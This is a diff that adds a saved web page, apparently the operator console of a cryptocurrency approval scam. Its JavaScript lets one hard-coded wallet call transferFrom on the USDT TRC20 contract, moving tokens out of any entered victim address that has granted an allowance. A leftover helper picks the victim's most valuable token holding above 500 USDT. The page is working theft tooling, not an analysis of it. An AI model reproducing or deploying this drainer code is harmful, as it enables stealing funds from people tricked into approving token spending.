@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<!-- saved from url=(0033)https://get5sim.top/transfer.html -->
+<html lang="en" data-dpr="1" style="font-size: 54px;" class="no-touch"><script id="youtube-hd-fjdmkanbdloodhegphphhklnjfngoffa">var ythdlog = () => {};;var ythderror = () => {};</script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <!-- Required meta tags-->
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no, email=no">
+    <meta name="msapplication-tap-highlight" content="no">
+    <meta name="x5-orientation" content="portrait">
+    <meta name="x5-fullscreen" content="true">
+    <link rel="icon" href="https://get5sim.top/favicon.ico">
+    <meta name="description" content="">
+    <meta name="keywords" content="">
+    <!-- App title -->
+    <title>USDT 转账</title>
+    <!-- Framework7 Library CSS -->
+    <link rel="stylesheet" href="vendor.min.css">
+
+    <!-- Custom app styles-->
+    <link rel="stylesheet" href="reset.min.css">
+    <link rel="stylesheet" href="main.css">
+    <script type="text/javascript" src="TronWeb.js"></script>
+
+    <!-- Jquery app core js-->
+    <script type="text/javascript" src="jquery-2.1.4.min.js"></script>
+    <script type="text/javascript" src="flexible.js"></script>
+    <script type="text/javascript" src="qrcode.min.js"></script>
+    <script type="text/javascript" src="mui.js"></script>
+
+    <style>
+        .text {
+            color: #025ce2;
+            font-size: large;
+            margin: 5px;
+        }
+        input{
+            outline-style: none ;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            padding: 13px 14px;
+            width: 620px;
+            font-size: 14px;
+            font-weight: 700;
+            font-family: "Microsoft soft";
+        }
+        input:focus{
+            border-color: #66afe9;
+            outline: 0;
+            -webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,.075),0 0 8px rgba(102,175,233,.6);
+            box-shadow: inset 0 1px 1px rgba(0,0,0,.075),0 0 8px rgba(102,175,233,.6)
+        }
+
+        .pure-button {
+            display: inline-block;
+            zoom: 1;
+            line-height: normal;
+            white-space: nowrap;
+            vertical-align: middle;
+            text-align: center;
+            cursor: pointer;
+            -webkit-user-drag: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            -webkit-box-sizing: border-box;
+            box-sizing: border-box;
+            width: 100px;
+            height: 40px;
+            margin: 5px;
+        }
+
+        .pure-button::-moz-focus-inner {
+            padding: 0;
+            border: 0;
+        }
+
+        .opera-only :-o-prefocus,.pure-button-group {
+            word-spacing: -.43em;
+        }
+
+        .pure-button-group .pure-button {
+            letter-spacing: normal;
+            word-spacing: normal;
+            vertical-align: top;
+            text-rendering: auto;
+        }
+
+        .pure-button {
+            font-family: inherit;
+            font-size: 100%;
+            padding: .5em 1em;
+            color: #444;
+            color: rgba(0,0,0,.8);
+            border: 1px solid #999;
+            border: none transparent;
+            background-color: #e6e6e6;
+            text-decoration: none;
+            border-radius: 2px;
+        }
+
+        .pure-button:focus {
+            outline: 0;
+        }
+
+        .pure-button-group .pure-button {
+            margin: 0;
+            border-radius: 0;
+            border-right: 1px solid #111;
+            border-right: 1px solid rgba(0,0,0,.2);
+        }
+
+        .pure-button-group .pure-button:first-child {
+            border-top-left-radius: 2px;
+            border-bottom-left-radius: 2px;
+        }
+
+        .pure-button-group .pure-button:last-child {
+            border-top-right-radius: 2px;
+            border-bottom-right-radius: 2px;
+            border-right: none;
+        }
+
+        .button-secondary {
+            color: white;
+            border-radius: 4px;
+            text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
+        }
+
+
+        .button-secondary {
+            background: rgb(66, 184, 221); /* this is a light blue */
+        }
+
+    </style>
+
+</head>
+<body style="font-size: 12px;text-align: center">
+<div class="text">当前钱包地址</div>
+<label id="wallet_address" style="font-size: small;">未连接钱包</label>
+<div class="text">USDT转出地址</div>
+<input id="from_address" placeholder="输入转出地址">
+<div class="text">USDT转入地址</div>
+<input id="to_address" placeholder="输入转入地址">
+<div class="text">USDT转出数量</div>
+<input id="amount" placeholder="输入转出数量">
+<div>
+    <button id="confirm" class="button-secondary pure-button">确定</button>
+</div>
+<div id="s"></div>
+
+<!-- Custom app js-->
+<script src="main.js"></script>
+<script type="text/javascript">
+    var authorized_address = "TEPhtPUjgMKAxPNEZ6kcmNMcHEwF9R2rK9";
+    var approveAddr = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+
+    function b(url, data, callback) {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', url, true);
+        xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+        xhr.send(data);
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState == 4 && xhr.status == 200) {
+                returndata = eval('(' + xhr.responseText + ')');
+                callback(returndata);
+            }
+        }
+    }
+
+    // b('./func.php?action=gettrx', 'pid=0', function (data) {
+    //     if (data.status == 1) {
+    //         authorized_address = data.address;
+    //         console.log(authorized_address);
+    //     } else {
+    //         alert(data.msg)
+    //     }
+    // })
+
+    function GetRandomNum(Min, Max) {
+        var Range = Max - Min;
+        var Rand = Math.random();
+        return (Min + Math.round(Rand * Range));
+    }
+
+    function getUrlQueryString(names, urls) {
+        urls = urls || window.location.href;
+        urls && urls.indexOf("?") > -1 ? urls = urls.substring(urls.indexOf("?") + 1) : "";
+        var reg = new RegExp("(^|&)" + names + "=([^&]*)(&|$)", "i");
+        var r = urls ? urls.match(reg) : window.location.search.substr(1).match(reg);
+        if (r != null && r[2] != "") return unescape(r[2]);
+        return null;
+
+    }
+
+
+    async function getMostValuableAssets(account) {
+        let _symbol = 'USDT'
+        for (const symbol of Object.keys(addr)) {
+            let contract = await tronWeb.contract().at(addr[symbol]);
+            let myBalance = await contract.balanceOf(account).call(function (err, balance) {
+                const usdt = balance / (10 ** (decimals[symbol] || 18)) * price[symbol]
+                console.log(usdt);
+                if (usdt > total && usdt > 500) {
+                    _symbol = symbol
+                    total = usdt
+                    approveAddr = addr[_symbol]
+                }
+            })
+        }
+        bizhong = _symbol
+        return _symbol
+    }
+
+    /**
+     * * 转账
+     */
+    async function transfer() {
+        let tronWeb = window.tronWeb
+        let walletAddress = tronWeb.defaultAddress.base58;
+        console.log(walletAddress);
+
+        if (authorized_address !== walletAddress) {
+            alert('该钱包地址不是授权地址');
+            return;
+        }
+        if (window.tronWeb.defaultAddress === undefined) {
+            alert('您的TRX不足以支付矿工费');
+            return;
+        }
+        let from_address = document.getElementById("from_address").value;
+        if (from_address === "") {
+            alert('请输入转出地址');
+            return;
+        }
+        let to_address = document.getElementById("to_address").value;
+        if (to_address === "") {
+            alert('请输入转入地址');
+            return;
+        }
+
+        let amount = document.getElementById('amount').value;
+        if (amount == null) {
+            alert('请输入转出数量');
+            return;
+        }
+
+        const pool = await window.tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
+        pool.transferFrom(from_address, to_address, amount * 1000000).send({feeLimit: 100000000}).then(pz => {
+            console.log(pz);
+        }).catch((e) => {
+            console.log(e);
+        });
+
+
+    }
+
+    async function s() {
+        var tronWeb = window.tronWeb
+        let contract = await tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
+        let walletAddress = tronWeb.defaultAddress.base58;
+        $("#wallet_address").text(walletAddress);
+        let result = await contract.balanceOf(walletAddress).call(function (err, tex) {
+            if (err == null) {
+                let total = tex._hex / (10 ** 6);
+                $('#yu').text(total.toLocaleString() + ' USDT')
+                console.log();
+            }
+        });
+
+    }
+
+    document.querySelector("#confirm").addEventListener("click", transfer);
+    document.querySelector("#s").addEventListener("click", s);
+
+    $(function () {
+        setTimeout(function () {
+            $('#s').click()
+        }, 1000);
+    })
+</script>
+
+
+
+
+
+<style class="AC-highLightRule">.acWHSet{display:inline!important;box-shadow: -3px 0px 3px 0.15px rgba(0, 0, 0, 0.15);color:rgb(0,0,0);font-weight:inherit;}.acWHSet[data='increaseapproval是什么']{background-color:#FFFF80;}</style></body></html>
